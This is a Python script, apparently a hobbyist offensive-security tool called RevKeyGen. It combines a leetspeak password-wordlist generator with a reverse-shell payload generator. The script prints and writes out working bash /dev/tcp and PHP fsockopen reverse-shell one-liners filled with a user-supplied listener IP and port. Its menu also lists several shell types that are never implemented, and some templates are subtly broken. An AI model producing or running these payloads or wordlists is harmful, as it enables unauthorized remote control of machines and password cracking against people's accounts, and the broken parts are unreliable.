import sys
import pyperclip3 as pc
from itertools import product
from pyfiglet import Figlet
from termcolor import colored
import os
import time
import ipaddress

os.system("clear")
print(r""""......................................................................
...............................................:-===-.................
..............-+++=:.......................:+#@@@@@@@@%*-.............
............+@%+=+#@#:....................+@@@@%*+=+#@@@@#:...........
...........#@*:....-@@...................%@@@%-.......*@@@@:..........
..........+@@@@@@@@@@@@@@%%%%%%#######**#@@@#..........*@@@*..........
..........*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-..........-@@@%..........
..........=@@******@@%#####%%%%%%@@@@@@@@@@@-..........+@@@#..........
...........=@@+:..%@*...................+@@@%.........=@@@@-..........
.............#@+..#@+....................*@@@@=:....-#@@@@-...........
.............@@:..:@@.....................=%@@@@@%@@@@@@*:............
............-@%....#@=......................:+#%@@@%#+-...............
............*@*-=+*%@%................................................
............%%#**+=-:.................................................
......................................................................
""")
f = Figlet(font='slant')
print(colored(f.renderText('RevKeyGen'), 'yellow'))
print('\t---------------------------------------------')
print('\tA CUSTOM PASSWORD AND REVERSE SHELL GENERATOR ')
print('\t---------------------------------------------\n')
print('\t\t\t\t\t\tAuthor -  MANAV SHARMA\n')

import sys
import os
import pyperclip3 as pc
from itertools import product
import time

dictionary = { 'a': ['a','A','@','4'],'b': ['b','B','8','6'],'c': ['c','C','[','{','(','<'], 'd': ['d','D',], 'e': ['e','E','3'], 'f': ['f','F'], 'g': ['g','G','6','9'], 'h': ['h','H','#'], 'i': ['i','I','1','l','L','|','!'], 'j': ['j','J'], 'k': ['k','K'], 'l': ['l','L','i','I','|','!','1'], 'm': ['m','M'], 'n': ['n','N'], 'o': ['o','O','0','Q'], 'p': ['p','P'], 'q': ['q','Q','9','0','O'], 'r': ['r','R'], 's': ['s','S','$','5'], 't': ['t','T','+','7'], 'u': ['u','U','v','V'], 'v': ['v','V','u','U'], 'w': ['w','W'], 'x': ['x','X','+'], 'y': ['y','Y'], 'z': ['z','Z','2'], }
dummychars = ['1','2','3','4','5','6','7','8','9','0','!','@','#','$','%','^','&','*','?']
specialchars = ['!','@','#','$','%','^','&','*','?']
numericals = ['1','2','3','4','5','6','7','8','9','0']

def fullSub():
	try:
		password = input("Enter password format:-")
		letters = []
		for val in password:
			if val in dictionary.keys():
				letters.append(dictionary[val])
			else:
				letters.append(val)
		a = [''.join(item) for item in product(*letters)]
		print("What to do with result?")
		print("1. print Output on screen\n2. Copy output to clipboard\n3. Copy output in file")
		printoptionschoice = input("Your Choice >")
		if printoptionschoice == '1':
			print (a)
			print ('%s passwords generated.' % len(a))

		elif printoptionschoice == '2':
			pwList = '\n'.join(a)
			print ('%s passwords copied to the clipboard.' % (len(a)))
			pc.copy(pwList)

		elif printoptionschoice == '3':
			outputFile = input("Enter Output File Name:-")
			with open(outputFile, 'w') as f:
				f.write('\n'.join(a))
			print ('%s passwords written to %s' % (len(a), outputFile))
			f.close()
		else:
			print("Enter Valid choice")
			fullSub()
		choice = input("Do you want to continue(y/n):- ")
		if choice == 'y':
			fullSub()
		elif choice == 'n':
			keygen()
		else:
			print("Enter y or n:--")

	except KeyboardInterrupt:
		print("\n")
		print("\nCtrl + C pressed............. Quitting. ")
		keygen()

def basicgen():
	try:
		password = input("Enter password format:-")
		numbers = False
		numCombos = [''.join(password) for n in range(1, 5) for password in product(numericals, repeat=n)]
		characterList = numCombos if numbers else dummychars
		a = []
		middle = password[1:]
		replacements = product(dictionary[password[0]], characterList)
		for val in replacements:
			a.append(val[0] + middle + val[1])
		print("What to do with result?")
		print("1. print Output on screen\n2. Copy output to clipboard\n3. Copy output in file")
		printoptionschoice = input("Your Choice >")
		if printoptionschoice == '1':
			print (a)
			print ('%s passwords generated.' % len(a))

		elif printoptionschoice == '2':
			pwList = '\n'.join(a)
			print ('%s passwords copied to the clipboard.' % (len(a)))
			pc.copy(pwList)

		elif printoptionschoice == '3':
			outputFile = input("Enter Output File Name:-")
			with open(outputFile, 'w') as f:
				f.write('\n'.join(a))
			print ('%s passwords written to %s' % (len(a), outputFile))
			f.close()

		else:
			print("Enter Valid choice")
			basicgen()
		choice = input("Do you want to continue(y/n):- ")
		if choice == 'y':
			basicgen()
		elif choice == 'n':
			keygen()
		else:
			print("Enter y or n:--")

	except KeyboardInterrupt:
		print("\n")
		print("\nCtrl + C pressed............. Quitting. ")
		keygen()

def passwithnumber():
	try:
		password = input("Enter password format:-")
		numbers = True
		numCombos = [''.join(password) for n in range(1, 5) for password in product(numericals, repeat=n)]
		characterList = numCombos if numbers else dummychars
		a = []
		middle = password[1:]
		replacements = product(dictionary[password[0]], characterList)
		for val in replacements:
			a.append(val[0] + middle + val[1])
		print("What to do with result?")
		print("1. print Output on screen\n2. Copy output to clipboard\n3. Copy output in file")
		printoptionschoice = input("Your Choice >")
		if printoptionschoice == '1':
			print (a)
			print ('%s passwords generated.' % len(a))

		elif printoptionschoice == '2':
			pwList = '\n'.join(a)
			print ('%s passwords copied to the clipboard.' % (len(a)))
			pc.copy(pwList)

		elif printoptionschoice == '3':
			outputFile = input("Enter Output File Name:-")
			with open(outputFile, 'w') as f:
				f.write('\n'.join(a))
			print ('%s passwords written to %s' % (len(a), outputFile))
			f.close()

		else:
			print("Enter Valid choice")
			passwithnumber()

		choice = input("Do you want to continue(y/n):- ")
		if choice == 'y':
			passwithnumber()
		elif choice == 'n':
			keygen()
		else:
			print("Enter y or n:--")

	except KeyboardInterrupt:
		print("\n")
		print("\nCtrl + C pressed............. Quitting. ")
		keygen()


def keygen():
	time.sleep(2)
	choose = 0
	try:
		while (choose != '4'):
			time.sleep(1)
			print("--------------------------------------------------")
			print("|            Password Production Menu            |")
			print("--------------------------------------------------")
			print("{1} Generate list of every possible combination  |")
			print("{2} Generate list of basic combination           |")
			print("{3} Generate list with numericals after password |")
			print("{4} Exit from tool                               |")
			print("--------------------------------------------------")
			choose = input("Enter your choice:-")
			if choose == '1':
				fullSub()
			elif choose == '2':
				basicgen()
			elif choose == '3':
				passwithnumber()
			elif choose == '4':
				grandop()
			elif choose == 'clear':
				os.system('clear')
			elif choose == 'ifconfig':
				os.system('ifconfig')
			elif choose == 'exit':
				os.system('Ctrl+c')
				sys.exit(0)
			else:
				print("Enter Valid Input")
				keygen()

	except KeyboardInterrupt:
		time.sleep(2)
		print("\nCtrl + C pressed.............Exiting")
		time.sleep(2)
		print("[+] Process  Terminated.........")

import os
import sys
import ipaddress

def revgen():
    try:
        print("-------------------------------------------------------------------")
        print("|                      Available Reverse Shells                   |")
        print("-------------------------------------------------------------------")
        print("""|1. bash reverse shell      2. php reverse shell                  |
| 3. netcat reverse shell   4. telnet reverse shell | port 80 req.|
| 5. perl reverse shell     6. perl windows reverse shell         |
| 7. java reverse shell     8. python reverse shell               |
| 9. powershell windows reverse shell                             |""")
        print("-------------------------------------------------------------------")
        Shelltype = input("Shell#\t")
        if Shelltype == '1':
            bashshell()
        elif Shelltype == '2':
            phpshell()
        elif Shelltype == '3':
            ncshell()
        elif Shelltype == '4':
            tenetshell()
        elif Shelltype == '5':
            perlshell()
        elif Shelltype == '6':
            perlwinshell()
        elif Shelltype == '7':
            javashell()
        elif Shelltype == '8':
            pythonshell()
        elif Shelltype == '9':
            powerwinshell()
        elif Shelltype == 'clear':
            os.system('clear')
            revgen()
        elif Shelltype == 'ifconfig':
            os.system('ifconfig')
            revgen()
        elif Shelltype == 'exit':
            os.system('Ctrl+c')
            sys.exit()
        else:
            print("Enter b/w 1-9>>\t")
            revgen()
    except KeyboardInterrupt:
        pass

def bashshell():
    try:
        print("-------------------------------")
        print("|  Available Payloads (Bash)  |")
        print("-------------------------------")
        print("|   1. Bash TCP    |")
        print("|   2. Bash UDP    |")
        print("--------------------")
        bashpayload = input("Use Payload Type:-")
        if bashpayload == '1':
            bashshellTCP()
        elif bashpayload == '2':
            bashshellUDP()
        else:
            print("Enter Valid Input")
            bashshell()
    except KeyboardInterrupt:
        pass
def bashshellTCP():
    try:
        print("---------------------")
        print("|  Bash TCP Shells  |")
        print("---------------------")
        print("""(A) bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
(B)0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196
(C)/bin/bash -l > /dev/tcp/{IP}/{PORT} 0<&1 2>&1""")
        while True:
            lhost = input("Please enter the ip address to listen from(e.g. 0.0.0.0.) :-")
            try:
                ip_address_obj = ipaddress.ip_address(lhost)
                print("Valid IP address")
                break
            except:
                print("Invalid IP address")

        lport = input("Please enter the listener port(from 0-65536):-")
        bashshellTCPchoice = input("Use shell no.>\t")
        if bashshellTCPchoice == '1':
            shell = ("bash -i >& /dev/tcp/%s/%s 0>&1" % (lhost , lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile, 'w') as f:
                f.write('\n'.join(shell))
            print ('Reverse shell is generated as %s' % outputFile)
        elif bashshellTCPchoice == '2':
            shell = ("0<&196;exec 196<>/dev/tcp/%s/%s; sh <&196 >&196 2>&196" % (lhost , lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile, 'w') as f:
                f.write('\n'.join(shell))
            print ('Reverse shell is generated as %s' % outputFile)
        elif bashshellTCPchoice == '3':
            shell = ("/bin/bash -l > /dev/tcp/%s/%s 0<&1 2>&1" % (lhost , lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile, 'w') as f:
                f.write('\n'.join(shell))
            print ('Reverse shell is generated as %s' % outputFile)
        else:
            print("These are the only available shell scripts")
            bashshellTCP()

        choice = input("Want to Continue? (y/n/exit):\t ")
        if choice == 'y':
            bashshellTCP()
        elif choice == 'n':
            bashshell()
        elif choice == 'exit':
            sys.exit()
        else:
            print("bkbsk")

    except KeyboardInterrupt:
        print("\n")
        print("\nCtrl + C pressed............. Quitting. ")

def bashshellUDP():
    try:
        print("---------------------")
        print("|  Bash UDP Shells  |")
        print("---------------------")
        print("(A) sh -i >& /dev/udp/{IP}/{PORT} 0>&1 ")
        while True:
            lhost = input("Please enter the ip address to listen from(e.g. 0.0.0.0.) :-")
            try:
                ip_address_obj = ipaddress.ip_address(lhost)
                print("Valid IP address")
                break
            except:
                print("Invalid IP address")

        lport = input("Please enter the listener port(from 0-65536):-")
        shell = ("bash -i >& /dev/tcp/%s/%s 0>&1" % (lhost , lport))
        outputFile = input("Enter Shell file Name:-")
        with open(outputFile, 'w') as f:
            f.write('\n'.join(shell))
            print ('Reverse shell is generated as %s' % outputFile)
        choice = input("Want to Continue? (y/n/exit):\t ")
        if choice == 'y':
            bashshellUDP()
        elif choice == 'n':
            bashshell()
        elif choice == 'exit':
            sys.exit()
        else:
            print("bkbsk")

    except KeyboardInterrupt:
        print("\n")
        print("\nCtrl + C pressed............. Quitting. ")

def phpshell():
    try:
        print("------------------------------")
        print("|  Available Payloads (PHP)  |")
        print("------------------------------")
        print("""(A)php -r '$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'
(B)php -r '$sock=fsockopen("{IP}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");'
(C)php -r '$sock=fsockopen("{IP}",{PORT});`/bin/sh -i <&3 >&3 2>&3`;'
(D)php -r '$sock=fsockopen("{IP}",{PORT});system("/bin/sh -i <&3 >&3 2>&3");'
(E)php -r '$sock=fsockopen("{IP}",{PORT});passthru("/bin/sh -i <&3 >&3 2>&3");'
(F)php -r '$sock=fsockopen("{IP}",{PORT});popen("/bin/sh -i <&3 >&3 2>&3", "r");'
(G)php -r '$sock=fsockopen("{IP}",{PORT});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""")
        while True:
            lhost = input("Please enter the ip address to listen from(e.g. 0.0.0.0.) :-")
            try:
                ip_address_obj = ipaddress.ip_address(lhost)
                print("Valid IP address")
                break
            except:
                print("Invalid IP address")

        lport = input("Please enter the listener port(from 0-65536):-")
        phpshellchoice = input("Use shell no.>\t")
        if phpshellchoice == '1':
            shell = ("""php -r '$sock=fsockopen("%s",80);" exec "/bin/sh -i <&3 >&3 2>&3" ;'""" % (lhost , lport) )
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile, 'w') as f:
                f.write('\n'.join(shell))
            print ('Reverse shell is generated as %s' % outputFile)

        elif phpshellchoice == '2':
            shell = ("""php -r '$sock=fsockopen("%s",80);shell_exec("/bin/sh -i <&3 >&3 2>&3");'""" % ( lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile, 'w') as f:
                f.write('\n'.join(shell))
            print ('Reverse shell is generated as %s' % outputFile)

        elif phpshellchoice == '3':
            shell = ("""php -r '$sock=fsockopen("%s",%s);`/bin/sh -i <&3 >&3 2>&3`;'""" % (lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile, 'w') as f:
                f.write('\n'.join(shell))
            print ('Reverse shell is generated as %s' % outputFile)

        elif phpshellchoice == '4':
            shell = ("""php -r '$sock=fsockopen("%s",%s);system("/bin/sh -i <&3 >&3 2>&3");'""" % (lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile, 'w') as f:
                f.write('\n'.join(shell))
            print ('Reverse shell is generated as %s' % outputFile)

        elif phpshellchoice == '5':
            shell = ("""php -r '$sock=fsockopen("%s",%s);passthru("/bin/sh -i <&3 >&3 2>&3");'""" % (lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile, 'w') as f:
                f.write('\n'.join(shell))
            print ('Reverse shell is generated as %s' % outputFile)

        elif phpshellchoice == '6':
            shell = ("""php -r '$sock=fsockopen("%s",%s);popen("/bin/sh -i <&3 >&3 2>&3", "r");'""" % (lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile, 'w') as f:
                f.write('\n'.join(shell))
            print ('Reverse shell is generated as %s' % outputFile)

        elif phpshellchoice == '7':
            shell = ("""php -r '$sock=fsockopen("%s",%s);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""" % (lhost, lport))
            outputFile = input("Enter Shell file Name:-")
            with open(outputFile, 'w') as f:
                f.write('\n'.join(shell))
            print ('Reverse shell is generated as %s' % outputFile)

        else:
            print("These are the only available shell scripts")
            phpshell()

        choice = input("Want to Continue? (y/n/exit):\t ")
        if choice == 'y':
            phpshell()
        elif choice == 'n':
            grandop()
        elif choice == 'exit':
            sys.exit()
        else:
            print("bkbsk")

    except KeyboardInterrupt:
        print("\n")
        print("\nCtrl + C pressed............. Quitting. ")
    except KeyboardInterrupt:
        pass



def grandop():
    print("---------------------------------------")
    print('|           Modules Present           |')
    print("---------------------------------------")
    print(colored("|  1. Custom Password Generator       |", 'green'))
    print(colored("|  2. Custom Reverse Shell Generator  |", 'green'))
    print(colored("|  3. Exit from the tool              |", 'green'))
    print("---------------------------------------")
    try:
        choice = input("WKG >>")
        if choice == '1':
            print("You Choose Password production")
            keygen()
        elif choice == '2':
            print("You choose Reverse Shell production")
            time.sleep(2)
            print("Setting Up elements...")
            revgen()
        elif choice == '3':
            print("Exiting The tool.......")
            time.sleep(2)
            exit()
        elif choice == 'clear':
            os.system('clear')
            grandop()
        elif choice == 'ifconfig':
            os.system('ifconfig')
            grandop()
        else:
            print("Enter Valid Choice")
            grandop()

    except KeyboardInterrupt:
        time.sleep(2)
        print("\nCtrl + C pressed.............Exiting")
        time.sleep(2)
        print("[+] Process Terminated.........")


grandop()

